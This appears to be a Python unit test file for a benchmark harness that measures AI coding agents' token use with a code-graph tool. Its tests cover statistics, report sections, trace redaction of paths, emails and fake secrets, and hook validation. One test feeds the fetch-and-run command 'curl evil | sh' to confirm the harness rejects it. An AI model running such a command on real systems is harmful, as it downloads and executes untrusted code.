"""Unit tests for the v2 report, comparisons and publication redaction (no network)."""

import json
import os
import shutil
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

import experiment_v2 as V2  # noqa: E402


def _row(cond, q, tok, *, task="A", agent="claude", corpus="httpx", source="v2", hits=4,
         total=5, ok=True):
    return {"id": f"{agent}-{task}-{q}-{cond}-{tok}", "task": task, "agent": agent,
            "corpus": corpus, "question": q, "cond": cond, "source": source, "ok": ok,
            "total_tokens": tok, "input_tokens": 10, "output_tokens": 100, "cost_usd": 0.1,
            "tool_calls": 3, "graphify_calls": int(cond != "base"),
            "gfy_attempted": int(cond != "base"), "gfy_succeeded": int(cond != "base"),
            "gfy_output_chars": 100 * int(cond != "base"), "rubric_hits": hits,
            "other_tools": 21 if tok % 2 == 0 else 46,
            "rubric_total": total, "hook_fires": 0, "hook_denials": 0}


class TestComparisons(unittest.TestCase):
    def test_pooled_base_and_per_question_ratios(self):
        rows = [_row("base", "q1", 100, source="v1"), _row("base", "q1", 120),
                _row("base", "q2", 200, source="v1"),
                _row("hooks", "q1", 220), _row("hooks", "q2", 200)]
        (c,) = V2.comparisons(rows)
        self.assertEqual(c["cond"], "hooks")
        self.assertEqual(c["n_base"], 3)            # v1 + v2 base pooled
        self.assertEqual(c["base_median_tokens"], 120)
        # q1: 220 / median(100,120)=110 -> 2.0 ; q2: 200/200 -> 1.0 ; geomean sqrt(2)
        self.assertAlmostEqual(c["q_ratio_geomean"], 2 ** 0.5)
        self.assertEqual((c["q_cheaper"], c["q_total"]), (0, 2))
        self.assertAlmostEqual(c["delta_median"], 210 / 120 - 1)

    def test_failed_sessions_are_excluded(self):
        rows = [_row("base", "q1", 100), _row("strict", "q1", 50),
                _row("strict", "q1", 10_000, ok=False)]
        (c,) = V2.comparisons(rows)
        self.assertEqual(c["median_tokens"], 50)

    def test_drift_compares_v1_and_v2_base(self):
        rows = [_row("base", "q1", 100, source="v1", corpus="anvil"),
                _row("base", "q1", 110, corpus="anvil")]
        (d,) = V2.drift(rows)
        self.assertAlmostEqual(d["delta"], 0.10)


class TestSameRunBase(unittest.TestCase):
    def test_sensitivity_uses_only_the_conditions_run(self):
        rows = [_row("base", "q1", 100, source="v1"), _row("base", "q1", 200),
                _row("hooks", "q1", 300)]
        (pooled,) = V2.comparisons(rows)
        (same,) = V2.comparisons(rows, same_run_base=True)
        self.assertEqual(pooled["n_base"], 2)
        self.assertEqual(same["n_base"], 1)
        self.assertAlmostEqual(same["delta_median"], 0.5)


class TestCodexOnlyReport(unittest.TestCase):
    def test_report_renders_without_claude_version(self):
        rows = [_row("base", "q1", 100, agent="codex", source="v1"),
                _row("rules-official", "q1", 130, agent="codex")]
        env1 = {"prepare": {}}
        env2 = {"claude_version": None, "claude_model": "sonnet", "codex_version": "y",
                "codex_model": "default", "graphify_version": "g", "prepare": {"task_b": {}}}
        text = V2.render_report(rows, {"summary": [], "sessions": 2, "failed": []}, env1, env2)
        self.assertIn("Claude Code `n/a`", text)


class TestToolSet(unittest.TestCase):
    def test_section_only_when_tool_sets_differ_and_reports_flips(self):
        same = [_row("base", "q1", 100), _row("hooks", "q1", 150)]
        for r in same:
            r["other_tools"] = 21
        self.assertEqual(V2.tool_set_section(same), [])
        rows = [_row("base", "q1", 100), _row("base", "q1", 300), _row("hooks", "q1", 150),
                _row("hooks", "q1", 500)]
        for r, n in zip(rows, (21, 46, 21, 46), strict=True):
            r["other_tools"] = n
        text = "\n".join(V2.tool_set_section(rows))
        self.assertIn("21 other tools", text)
        self.assertIn("| A | httpx | hooks | 1 | 1 | +50% |", text)


class TestReport(unittest.TestCase):
    def test_report_has_required_sections(self):
        rows = [_row("base", "q1", 100, source="v1"), _row("rules-official", "q1", 130)]
        res = {"summary": [], "sessions": 2, "failed": []}
        env1 = {"prepare": {"httpx": {"repo": "https://github.com/encode/httpx.git",
                                      "ref": "a" * 40, "py_files": 1, "py_lines": 10,
                                      "graph": {"nodes": 1, "edges": 1}}}}
        env2 = {"claude_version": "x", "claude_model": "sonnet", "codex_version": "y",
                "codex_model": "default", "graphify_version": "graphify 0.9.111",
                "prepare": {"task_b": {"pr1": {"url": "u", "title": "t", "base": "b" * 40,
                                               "head": "c" * 40}}}}
        text = V2.render_report(rows, res, env1, env2)
        for section in ("## Headline", "## Methodology", "## All groups", "## Drift check",
                        "## Limitations", "## Reproduce", "Graphify Cloud", "+30%",
                        "### Sensitivity", "## Did the agents use the graph?",
                        "### Run design and order", "5–8 items",
                        "geometric mean of these per-question median ratios"):
            self.assertIn(section, text)


class TestScrub(unittest.TestCase):
    def test_paths_users_and_output_cache(self):
        with mock.patch.dict(os.environ, {"USER": "alice"}):
            out = V2.scrub('"p":"~/.claude/projects/-Users-alice-wks-x-work-pr1/abc.txt" '
                           "cd ~/wks/forge && ~/wks/forge/scripts/graphify-safe.sh query q "
                           "~/wks/forge/.venv/lib/python3.12/x.py alice cd ~/forge-x && ls "
                           "netrc at ~/.netrc")
        self.assertNotIn("alice", out)
        self.assertIn("<claude-output-cache>/abc.txt", out)
        self.assertIn("<anvil-checkout>/scripts/graphify-safe.sh", out)
        self.assertIn("<venv>/lib/python3.12/x.py", out)
        self.assertIn("cd <local-path> && ls", out)
        self.assertIn("~/.netrc", out)          # library docs are not operator paths
        self.assertNotIn("wks/", out)
        self.assertNotIn("forge-x", out)

    def test_ls_owner_columns(self):
        out = V2.scrub(r"total 8\ndrwxr-xr-x@ 14 bob  staff  448 Nov 17 .")
        self.assertIn("user  staff", out)
        self.assertNotIn("bob", out)

    def test_emails_but_not_decorators_or_versions(self):
        src = r'x\n@pytest.fixture\n "python@3.12.13" mail me: a.b@example.org'
        out = V2.scrub(src)
        self.assertIn(r"\n@pytest.fixture", out)
        self.assertIn("python@3.12.13", out)
        self.assertIn("<email>", out)
        self.assertNotIn("a.b@example.org", out)
        self.assertEqual(V2.scrub("12345+x@users.noreply.github.com"), "<email>")

    def test_credential_shapes_and_hostname(self):
        fake = "sk-ant-" + "a1" * 15
        with mock.patch.object(V2.socket, "gethostname", return_value="forge-box.local"):
            out = V2.scrub(f"key={fake} on forge-box.local and nvapi-{'x' * 24}")
        self.assertNotIn(fake, out)
        self.assertNotIn("nvapi-x", out)
        self.assertEqual(out.count("<secret>"), 2)
        self.assertIn("<host>", out)

    def test_trace_init_keeps_only_public_tools(self):
        init = json.dumps({"type": "system", "subtype": "init", "cwd": "<work>/a",
                           "model": "m", "mcp_servers": [{"name": "Example Connector"}],
                           "tools": ["Bash", "Read", "mcp__example__tool",
                                     "DesignSync", "Grep"],
                           "skills": ["x"], "memory_paths": {"auto": "p"}})
        out = json.loads(V2.scrub_trace_line(init))
        self.assertEqual(out["model"], "m")
        self.assertEqual(out["tools"], ["Bash", "Grep", "Read"])
        self.assertEqual(out["_other_tools"], 2)
        for k in ("mcp_servers", "skills", "memory_paths"):
            self.assertNotIn(k, out)
        self.assertNotIn("Example", json.dumps(out))
        rl = json.loads(V2.scrub_trace_line(json.dumps(
            {"type": "rate_limit_event", "rate_limit_info": {"utilization": 0.3}})))
        self.assertNotIn("rate_limit_info", rl)

    def test_thinking_signatures_are_dropped(self):
        line = json.dumps({"type": "assistant", "message": {"content": [
            {"type": "thinking", "thinking": "t", "signature": "AKIA" + "Z" * 40}]}})
        out = V2.scrub_trace_line(line)
        self.assertNotIn("AKIA", out)
        self.assertIn('"thinking": "t"', out)

    def test_pseudonymizer_is_stable_keyed_and_keeps_links(self):
        p1, p2 = V2.Pseudonymizer(b"k1"), V2.Pseudonymizer(b"k2")
        sid = "1a2b3c4d-0000-4000-8000-00000000abcd"
        text = f'{{"session_id": "{sid}", "id": "toolu_01FAKEFAKEFAKEFAKEFAKE00", ' \
               f'"tool_use_id": "toolu_01FAKEFAKEFAKEFAKEFAKE00", "r": "req_0FAKEFAKEFAKEFAKE1"}}'
        a, b = p1(text), p1(text)
        self.assertEqual(a, b)
        self.assertNotEqual(a, p2(text))
        for orig in (sid, "01FAKEFAKEFAKEFAKEFAKE00", "0FAKEFAKEFAKEFAKE1"):
            self.assertNotIn(orig, a)
        d = json.loads(a)
        self.assertEqual(d["id"], d["tool_use_id"])            # links preserved
        self.assertRegex(d["session_id"], r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-")


def _claude_trace(cmd: str, is_error=False, out="NODE x", name="Bash") -> list[str]:
    return [json.dumps({"type": "assistant", "message": {"content": [
                {"type": "tool_use", "id": "t1", "name": name, "input": {"command": cmd}}]}}),
            json.dumps({"type": "user", "message": {"content": [
                {"type": "tool_result", "tool_use_id": "t1", "is_error": is_error,
                 "content": out}]}}),
            json.dumps({"type": "result", "subtype": "success", "is_error": False,
                        "usage": {"input_tokens": 1, "output_tokens": 1}, "result": "a"})]


def _codex_cmd(cmd: str, exit_code=0, out="NODE x") -> str:
    return json.dumps({"type": "item.completed", "item": {
        "type": "command_execution", "command": cmd, "aggregated_output": out,
        "exit_code": exit_code, "status": "completed"}})


class TestFreshRunFields(unittest.TestCase):
    def test_missing_fields_are_derived_from_the_trace(self):
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "claude-x.json"
            trace = [json.dumps({"type": "system", "subtype": "init",
                                 "tools": ["Bash", "mcp__a__b", "Other"]})]
            trace += _claude_trace("graphify query q")
            p.with_name("claude-x.trace.jsonl").write_text("\n".join(trace))
            r = V2._with_trace_fields({"agent": "claude", "id": "x"}, p)
            self.assertEqual((r["gfy_attempted"], r["gfy_succeeded"], r["other_tools"]),
                             (1, 1, 2))

    def test_local_install_paths_are_redacted(self):
        out = V2.scrub("/opt/homebrew/Cellar/python@3.12/3.12.13/bin/python3 x")
        self.assertEqual(out, "<local-install> x")


class TestGraphUse(unittest.TestCase):
    def test_successful_graphify_only_command(self):
        g = V2.graph_use(_claude_trace('graphify query "x" 2>&1 | head -100'), "claude")
        self.assertEqual((g["gfy_attempted"], g["gfy_succeeded"], g["gfy_compound"]), (1, 1, 0))
        self.assertEqual(g["gfy_output_chars"], len(json.dumps("NODE x")))

    def test_error_result_is_attempted_not_succeeded(self):
        g = V2.graph_use(_claude_trace("graphify query q", is_error=True), "claude")
        self.assertEqual((g["gfy_attempted"], g["gfy_succeeded"], g["gfy_output_chars"]),
                         (1, 0, 0))

    def test_section_counts_and_mixed_output_is_not_attributed(self):
        g = V2.graph_use(_claude_trace('graphify section "A"; rg -n foo .'), "claude")
        self.assertEqual((g["gfy_succeeded"], g["gfy_compound"], g["gfy_output_chars"]),
                         (1, 1, 0))

    def test_codex_exit_code_and_guard(self):
        ok = _codex_cmd("/bin/zsh -lc 'if test -f graphify-out/graph.json; then "
                        "graphify query \"q\"; fi'")
        bad = _codex_cmd("/bin/zsh -lc 'graphify explain X'", exit_code=1)
        g = V2.graph_use([ok, bad], "codex")
        self.assertEqual((g["gfy_attempted"], g["gfy_succeeded"], g["gfy_compound"]), (2, 1, 0))
        self.assertEqual(g["gfy_output_chars"], len("NODE x"))

    def test_mentions_do_not_count(self):
        g = V2.graph_use([_codex_cmd("/bin/zsh -lc 'ls graphify-out && cat x'")], "codex")
        self.assertEqual(g["gfy_attempted"], 0)


class TestStatusAndResume(unittest.TestCase):
    def _s(self):
        return V2.V1.Session("x", "codex", "httpx", "q", "base", 0, 0, ok=True)

    def test_nonzero_exit_fails_session(self):
        s = self._s()
        V2.finalize_status(s, "codex", ['{"type": "turn.completed"}'], 1, "boom")
        self.assertFalse(s.ok)
        self.assertIn("exit 1", s.error)

    def test_error_event_after_completion_fails_session(self):
        s = self._s()
        V2.finalize_status(s, "codex", ['{"type": "turn.completed"}',
                                        '{"type": "turn.failed", "error": "x"}'], 0)
        self.assertFalse(s.ok)

    def test_claude_error_result(self):
        s = V2.V1.Session("x", "claude", "httpx", "q", "base", 0, 0, ok=True)
        V2.finalize_status(s, "claude", [json.dumps({"type": "result",
                                                     "subtype": "error_max_budget_usd",
                                                     "is_error": True})], 0)
        self.assertFalse(s.ok)

    def test_clean_session_stays_ok(self):
        s = self._s()
        V2.finalize_status(s, "codex", ['{"type": "turn.completed"}'], 0)
        self.assertTrue(s.ok)

    def test_resume_skips_only_successful_sessions(self):
        with tempfile.TemporaryDirectory() as d:
            p = Path(d)
            (p / "good.json").write_text('{"ok": true}')
            (p / "bad.json").write_text('{"ok": false}')
            self.assertEqual(V2.completed_sessions(p), {"good"})


class TestResumeConfig(unittest.TestCase):
    def test_mismatched_versions_or_corpora_abort(self):
        prev = {"claude_version": "1", "graphify_version": "g", "prepare": {"a": 1}}
        V2.check_resume_config(prev, dict(prev))
        V2.check_resume_config(prev, {**prev, "codex_version": "x"})  # new agent: fine
        V2.check_resume_config({}, prev)
        for k, v in (("claude_version", "2"), ("prepare", {"a": 2})):
            with self.assertRaises(SystemExit):
                V2.check_resume_config(prev, {**prev, k: v})


class TestHookCommand(unittest.TestCase):
    def test_paths_with_spaces_are_quoted(self):
        with tempfile.TemporaryDirectory() as d:
            g = Path(d) / "my tools" / "graphify"
            g.parent.mkdir()
            g.write_text("")
            wrap = Path(d) / "repo dir" / "hookwrap.sh"
            installed = f"'{g}' hook-guard read"
            cmd = V2.hook_command(installed, wrap, g, strict=True)
            import shlex
            self.assertEqual(shlex.split(cmd), [str(wrap), str(g), "read", "strict"])

    def test_unexpected_hook_is_rejected(self):
        with self.assertRaises(RuntimeError):
            V2.hook_command("curl evil | sh", Path("/w"), Path("/g"), strict=False)


class TestSanitizeRuns(unittest.TestCase):
    def _raw(self, d: Path) -> Path:
        raw = d / "raw"
        sess = raw / "2026-11-18" / "sessions"
        sess.mkdir(parents=True)
        (raw / "2026-11-18" / "environment.json").write_text(json.dumps(
            {"prepare": {"task_b": {"pr1": {"rubric": ["foo"]}}}, "user": "/Users/zed/x"}))
        trace = _claude_trace("graphify query q", out="see /Users/zed/p")
        trace.insert(0, json.dumps({"type": "system", "subtype": "init",
                                    "session_id": "1a2b3c4d-0000-4000-8000-00000000abcd",
                                    "tools": ["Bash", "mcp__x__y"]}))
        (sess / "claude-B-pr1-r0-base.trace.jsonl").write_text("\n".join(trace) + "\n")
        (sess / "claude-B-pr1-r0-base.json").write_text(json.dumps(
            {"id": "claude-B-pr1-r0-base", "agent": "claude", "corpus": "httpx",
             "question": "pr1", "cond": "base", "rep": 0, "order": 0, "wall_s": 1.0,
             "task": "B", "graphify_calls": 99, "answer": "stale"}))
        return raw

    def test_rebuilds_records_redacts_and_is_deterministic(self):
        with tempfile.TemporaryDirectory() as d, mock.patch.dict(os.environ, {"USER": "zed"}):
            d = Path(d)
            raw = self._raw(d)
            runs = d / "runs"
            V2.sanitize_runs(raw, runs, b"key")
            first = {p: p.read_text() for p in runs.rglob("*") if p.is_file()}
            V2.sanitize_runs(raw, runs, b"key")
            self.assertEqual(first, {p: p.read_text() for p in runs.rglob("*") if p.is_file()})
            blob = "".join(first.values())
            for leak in ("zed", "/Users/", "mcp__", "1a2b3c4d-0000"):
                self.assertNotIn(leak, blob)
            rec = json.loads((runs / "2026-11-18/sessions/claude-B-pr1-r0-base.json")
                             .read_text())
            self.assertEqual(rec["answer"], "a")             # recomputed from the trace
            self.assertEqual(rec["gfy_succeeded"], 1)
            self.assertEqual(rec["graphify_calls"], 1)
            self.assertEqual(rec["rubric_total"], 1)
            self.assertIn("/Users/zed/p", (raw / "2026-11-18/sessions/"
                                           "claude-B-pr1-r0-base.trace.jsonl").read_text())

    def test_refuses_overlap_and_unknown_files(self):
        with tempfile.TemporaryDirectory() as d:
            d = Path(d)
            raw = self._raw(d)
            with self.assertRaises(ValueError):
                V2.sanitize_runs(raw, raw / "out", b"k")
            (raw / "2026-11-18" / "notes.txt").write_text("private")
            with self.assertRaises(ValueError):
                V2.sanitize_runs(raw, d / "runs", b"k")
            self.assertTrue((raw / "2026-11-18" / "notes.txt").exists())  # raw untouched

    def test_raw_named_like_a_staging_dir_is_never_deleted(self):
        with tempfile.TemporaryDirectory() as d:
            d = Path(d)
            raw = self._raw(d)
            staged_name = raw.rename(d / "runs.staging")
            V2.sanitize_runs(staged_name, d / "runs", b"k")
            self.assertTrue((staged_name / "2026-11-18" / "environment.json").exists())
            self.assertTrue((d / "runs" / "2026-11-18" / "environment.json").exists())
            self.assertEqual([p.name for p in d.iterdir() if "staging-" in p.name], [])

    def test_records_are_not_pseudonymized_twice(self):
        with tempfile.TemporaryDirectory() as d, mock.patch.dict(os.environ, {"USER": "zed"}):
            d = Path(d)
            raw = self._raw(d)
            sess = raw / "2026-11-18" / "sessions"
            t = sess / "claude-B-pr1-r0-base.trace.jsonl"
            uid = "1a2b3c4d-0000-4000-8000-0000000000ef"
            t.write_text(t.read_text().replace('"result": "a"', f'"result": "id {uid}"'))
            V2.sanitize_runs(raw, d / "runs", b"k")
            out = d / "runs" / "2026-11-18" / "sessions"
            rec = json.loads((out / "claude-B-pr1-r0-base.json").read_text())
            self.assertIn(rec["answer"], (out / "claude-B-pr1-r0-base.trace.jsonl").read_text())

    def test_sanitize_cli_refuses_paths_inside_repo(self):
        with self.assertRaises(SystemExit):
            V2.main(["sanitize", "--raw", str(ROOT / "raw"), "--key", "/tmp/k"])


class TestPublishedData(unittest.TestCase):
    """The published records must be exactly re-derivable from the published traces."""

    def test_v1_reparse_keeps_published_records(self):
        src = ROOT / "runs" / "2026-11-17"
        if not (src / "sessions").exists():
            self.skipTest("no published v1 run")
        import experiment as V1E
        with tempfile.TemporaryDirectory() as d:
            dst = Path(d) / "v1"
            shutil.copytree(src, dst)
            V1E.reparse(dst)
            for p in sorted((src / "sessions").glob("*.json")):
                self.assertEqual(json.loads((dst / "sessions" / p.name).read_text()),
                                 json.loads(p.read_text()), p.name)

    def test_records_match_their_traces(self):
        sessions = sorted((ROOT / "runs").glob("*/sessions/*.json"))
        if not sessions:
            self.skipTest("no published runs")
        envs = {}
        for p in sessions:
            meta = json.loads(p.read_text())
            run_dir = p.parent.parent
            envs.setdefault(run_dir, json.loads((run_dir / "environment.json").read_text()))
            lines = [ln for ln in p.with_name(p.stem + ".trace.jsonl").read_text()
                     .splitlines() if ln.strip()]
            tsv = p.with_name(p.stem + ".hooks.tsv")
            rec = V2.rebuild_record(meta, lines, tsv if tsv.exists() or "task" in meta
                                    else None, V2._rubric_for(meta, envs[run_dir]))
            self.assertEqual(rec, meta, p.name)


if __name__ == "__main__":
    unittest.main()
